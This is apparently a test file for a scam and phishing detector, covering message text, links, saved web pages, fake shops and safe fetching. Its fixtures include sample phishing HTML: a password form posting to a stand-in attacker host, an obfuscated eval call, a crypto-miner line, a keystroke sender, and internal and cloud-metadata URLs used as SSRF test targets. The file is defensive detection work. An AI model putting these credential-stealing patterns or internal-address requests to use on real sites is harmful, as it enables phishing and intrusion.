"""
Tests for the scam checker. Run with:  python test_scam_checker.py
If you change the code and a test fails, you know you broke something.
These tests never use the internet. The web page samples below are only
text, nothing in them is ever run.
"""

from datetime import datetime, timezone

import requests

from online_checks import (
    analyze_html,
    analyze_links,
    analyze_offers,
    analyze_payment,
    analyze_redirects,
    analyze_scripts,
    analyze_trust,
    domain_age_days,
    fetch_page,
    is_public_host,
    registered_domain,
)
from scam_checker import (
    analyze,
    analyze_saved_page,
    check_brand,
    check_link,
    check_page_brand,
    find_phrases,
    highlight_segments,
    normalize,
)


def verdict(text):
    return analyze(text, online=False)["verdict"]


# ----- text checks -----
def test_normal_message_is_safe():
    assert verdict("Hi, are we still meeting at 5pm tomorrow?") == "LOW RISK"


def test_obvious_scam_is_high_risk():
    text = "URGENT: your account will be closed. Verify your account and enter your PIN"
    assert verdict(text) == "HIGH RISK"


def test_letters_swapped_for_numbers():
    assert normalize("Pl3ase v3rify your acc0unt!!!") == "please verify your account"
    assert verdict("Pl3ase v3rify your acc0unt") == "SUSPICIOUS"


def test_french_with_accents():
    assert verdict("Félicitations vous avez été sélectionné, réclamez votre prix") == "SUSPICIOUS"


def test_arabic_with_diacritics():
    assert verdict("لَقَدْ فُزْتَ") == "SUSPICIOUS"


def test_spanish_scam():
    assert verdict("Urgente: su cuenta será cerrada, verifique su cuenta") == "HIGH RISK"


# ----- link checks -----
def test_fake_brand_link_inside_message():
    result = analyze("Click http://paypa1-secure-login.xyz/verify now", online=False)
    assert result["verdict"] == "HIGH RISK"
    assert any("imitates paypal" in r for r in result["reasons"])


def test_real_brand_link_is_safe():
    assert verdict("Sign in at https://www.paypal.com/signin") == "LOW RISK"


def test_microsoft_is_not_a_shortener():
    # old bug: "t.co" was found inside "microsoft.com"
    points, _ = check_link("https://www.microsoft.com")
    assert points == 0


def test_shortened_link():
    points, _ = check_link("https://bit.ly/abc")
    assert points == 3


def test_ip_address_link():
    points, _ = check_link("http://192.168.1.5/login")
    assert points == 6  # no https (+2) and raw IP (+4)


def test_at_sign_trick():
    _, reasons = check_link("https://google.com@evil-site.com/login")
    assert any("@" in r for r in reasons)


# ----- online-check logic (tested with fake data, no internet) -----
def test_registered_domain():
    assert registered_domain("login.secure.paypal.com") == "paypal.com"
    assert registered_domain("www.gtbank.com.ng") == "gtbank.com.ng"


def test_domain_age():
    data = {"events": [{"eventAction": "registration", "eventDate": "2026-10-20T00:00:00Z"}]}
    now = datetime(2026, 10, 29, tzinfo=timezone.utc)
    assert domain_age_days(data, now) == 9
    assert domain_age_days({"events": []}) is None


def test_redirects():
    chain = ["http://a.com", "http://b.com", "http://c.com", "http://d.org"]
    points, reasons = analyze_redirects(chain)
    assert points == 4 and len(reasons) == 2
    assert analyze_redirects(["https://example.com"])[0] == 0


def test_offline_mode_skips_online_checks():
    result = analyze("https://bit.ly/abc", online=False)
    assert "certificate" not in result["checks_run"]
    assert result["skipped"] == []


# ----- page forms -----
def test_password_form_sent_elsewhere():
    html = '<form action="https://evil.xyz/steal"><input type="password" name="p"></form>'
    points, reasons = analyze_html(html, "mybank.com")
    assert points == 5 and "evil.xyz" in reasons[0]


def test_password_form_over_http():
    html = '<form action="http://mybank.com/login"><input type="password"></form>'
    assert analyze_html(html, "mybank.com")[0] == 3


def test_normal_login_form_is_fine():
    html = '<form action="/login"><input type="password" name="p"></form>'
    assert analyze_html(html, "mybank.com")[0] == 0


def test_sensitive_fields_and_hidden_frame():
    html = '<input name="otp"><input placeholder="Enter your BVN"><iframe width="0" height="0"></iframe>'
    points, reasons = analyze_html(html, "example.com")
    assert points == 5  # sensitive fields +3, hidden frame +2


def test_page_title_brand():
    assert check_page_brand("PayPal - Log in", "paypa1-secure.com")[0] == 3
    assert check_page_brand("PayPal - Log in", "www.paypal.com")[0] == 0


# ----- page source: scripts and links -----
SUSPICIOUS_PAGE = """
<html><head><title>Account Verify</title>
<meta http-equiv="refresh" content="0; url=https://evil-site.xyz/go">
<script src="https://cdn.free-stuff.xyz/lib.js"></script>
<script>
eval(atob("YWxlcnQoMSk="));
Notification.requestPermission();
window.addEventListener("beforeunload", function(e){ e.returnValue = "stay"; });
</script></head>
<body oncontextmenu="return false">
<a href="http://evil-site.xyz/pay">www.paypal.com</a>
<a href="/files/update.apk">Download</a>
</body></html>
"""

CLEAN_PAGE = """
<html><head><title>My Blog</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
</head><body>
<a href="https://example.org/about">example.org</a>
<a href="/contact">Contact us</a>
<form action="/subscribe"><input name="email"></form>
</body></html>
"""


def test_scripts_find_tricks():
    points, reasons = analyze_scripts(SUSPICIOUS_PAGE, "example.com")
    text = " ".join(reasons)
    assert "obfuscation" in text
    assert "notifications" in text
    assert "stop you from leaving" in text
    assert "right-click" in text
    assert "suspicious address" in text
    assert points == 12  # 4 + 2 + 2 + 1 + 3


def test_crypto_miner():
    points, reasons = analyze_scripts("<script>var m = new CoinHive.Anonymous('x');</script>")
    assert points == 6 and "miner" in reasons[0]


def test_keystrokes_only_flagged_when_sent_away():
    listener = "document.addEventListener('keydown', function(e){ count++; });"
    assert analyze_scripts(f"<script>{listener}</script>")[0] == 0
    sender = listener + " fetch('/log', {method: 'POST'});"
    assert analyze_scripts(f"<script>{sender}</script>")[0] == 2


def test_links_find_tricks():
    points, reasons = analyze_links(SUSPICIOUS_PAGE, "example.com")
    text = " ".join(reasons)
    assert "paypal.com but really goes to evil-site.xyz" in text
    assert "program file" in text
    assert "automatically sends you" in text
    assert points == 12  # 5 + 4 + 3


def test_clean_page_has_no_flags():
    result = analyze_saved_page(CLEAN_PAGE, "myblog.com")
    assert result["verdict"] == "LOW RISK"
    assert result["score"] == 0


def test_suspicious_saved_page_is_high_risk():
    result = analyze_saved_page(SUSPICIOUS_PAGE, "example.com")
    assert result["verdict"] == "HIGH RISK"
    assert "page scripts" in result["checks_run"]


# ----- fake-shop checks -----
FAKE_SHOP = """
<html><head><title>Luxury Watches Outlet</title></head><body>
<h1>HUGE SALE!!! UP TO 90% OFF!!! HURRY, only 3 left in stock!!!</h1>
<p>Rolex, Omega and more at unbelievable prices. Add to cart now.</p>
<p>We accept bank transfer or Bitcoin only.</p>
<a href="/shop">Shop</a><a href="/cart">Cart</a><a href="/login">Login</a>
<form><input name="card_number"><input name="cvv"></form>
</body></html>
"""

REAL_SHOP = """
<html><head><title>Good Shoes</title></head><body>
<h1>Welcome</h1>
<p>Add to cart. We accept Visa, Mastercard and PayPal. Call us on +234 801 234 5678.</p>
<a href="/about">About us</a><a href="/contact">Contact</a><a href="/privacy">Privacy policy</a>
<a href="/terms">Terms and conditions</a><a href="/returns">Returns and refunds</a>
<a href="/shoes">Shoes</a>
</body></html>
"""


def test_payment_bank_transfer_only_and_no_https():
    assert analyze_payment(FAKE_SHOP, "x.com", https=False)[0] == 9  # transfer +4, card no https +5
    assert analyze_payment(FAKE_SHOP, "x.com", https=True)[0] == 4
    assert analyze_payment(FAKE_SHOP, "x.com", https=None)[0] == 4


def test_payment_gift_card():
    points, reasons = analyze_payment("<p>Pay with a gift card to claim your item</p>", "x.com")
    assert points == 4 and "gift cards" in reasons[0]


def test_trust_pages_missing_on_fake_shop():
    points, reasons = analyze_trust(FAKE_SHOP, "x.com")
    assert points == 9  # about/contact 3 + privacy/terms 2 + returns 2 + no contact details 2
    assert len(reasons) == 4


def test_trust_pages_present_on_real_shop():
    assert analyze_trust(REAL_SHOP, "goodshoes.com") == (0, [])


def test_trust_check_skips_pages_with_few_links():
    assert analyze_trust(CLEAN_PAGE, "myblog.com") is None


def test_offers_on_fake_shop():
    points, reasons = analyze_offers(FAKE_SHOP, "x.com")
    assert points == 6  # 90% off +3, urgency +2, shouting +1
    assert any("90%" in r for r in reasons)


def test_offers_investment_promises():
    assert analyze_offers("<p>Earn 5% daily profit, guaranteed!</p>")[0] == 5
    assert analyze_offers("<p>Get 10% per day on your deposit</p>")[0] == 5


def test_real_shop_is_clean():
    result = analyze_saved_page(REAL_SHOP, "goodshoes.com", https=True)
    assert result["verdict"] == "LOW RISK" and result["score"] == 0


def test_fake_shop_is_high_risk():
    result = analyze_saved_page(FAKE_SHOP, "watch-outlet-sale.xyz", https=False)
    assert result["verdict"] == "HIGH RISK"
    assert "payment methods" in result["checks_run"]


def test_regional_sites_are_not_fake():
    assert check_brand("www.amazon.co.uk") is None
    assert check_brand("www.nike.dz") is None
    assert check_brand("paypal.xyz") == "paypal"
    assert check_brand("nike-outlet-sale.com") == "nike"


# ----- safe fetching (the website opens links for visitors) -----
def blocked(url):
    try:
        fetch_page(url)
    except requests.exceptions.InvalidURL:
        return True
    return False


def test_internal_addresses_are_not_public():
    for host in ["127.0.0.1", "localhost", "192.168.1.1", "10.0.0.5", "169.254.169.254", "::1", ""]:
        assert not is_public_host(host), host


def test_fetch_refuses_internal_addresses_and_odd_ports():
    assert blocked("http://127.0.0.1/admin")
    assert blocked("http://169.254.169.254/latest/meta-data/")
    assert blocked("http://localhost:8080/")
    assert blocked("https://example.com:22/")


# ----- highlighting phrases in the visitor's message -----
def test_highlight_with_accents_and_punctuation():
    text = "Félicitations, vous avez été sélectionné! Réclamez votre prix."
    segments = highlight_segments(text, find_phrases(text))
    marked = [s["text"] for s in segments if s["mark"]]
    assert marked == ["Félicitations, vous avez été sélectionné", "Réclamez votre prix"]
    assert "".join(s["text"] for s in segments) == text


def test_highlight_arabic():
    text = "عاجل: لقد فزت!"
    marked = [s["text"] for s in highlight_segments(text, find_phrases(text)) if s["mark"]]
    assert marked == ["عاجل", "لقد فزت"]


def test_highlight_without_matches():
    assert highlight_segments("Hello there", []) == [{"text": "Hello there", "mark": None}]
    assert highlight_segments("", []) == []


if __name__ == "__main__":
    tests = [f for name, f in sorted(globals().items()) if name.startswith("test_")]
    failed = 0
    for test in tests:
        try:
            test()
            print(f"PASS  {test.__name__}")
        except AssertionError:
            failed += 1
            print(f"FAIL  {test.__name__}")
    print(f"\n{len(tests) - failed} of {len(tests)} tests passed")
